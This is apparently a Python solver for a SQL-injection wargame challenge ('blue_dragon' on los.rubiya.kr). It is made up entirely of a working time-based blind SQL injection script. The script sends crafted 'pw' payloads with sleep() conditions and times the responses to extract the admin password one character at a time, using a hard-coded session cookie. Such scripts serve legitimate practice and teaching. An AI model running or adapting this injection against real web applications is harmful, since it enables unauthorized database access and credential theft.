import requests
import time

url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php"
cookies = dict(PHPSESSID="1j4nr4gc2tcc0k9e68hquspdvb")

pw = ''
for i in range(1,9):
    for j in range(48, 128):
        payload = f"1' or if(id='admin' and ascii(substr(pw,{i},1))={j},sleep(3),1)#"
        start = time.time()

        response = requests.get(url, cookies=cookies, params={"pw": payload})

        end = time.time()

        if end-start > 3:
            pw += chr(j)
            break
print(pw)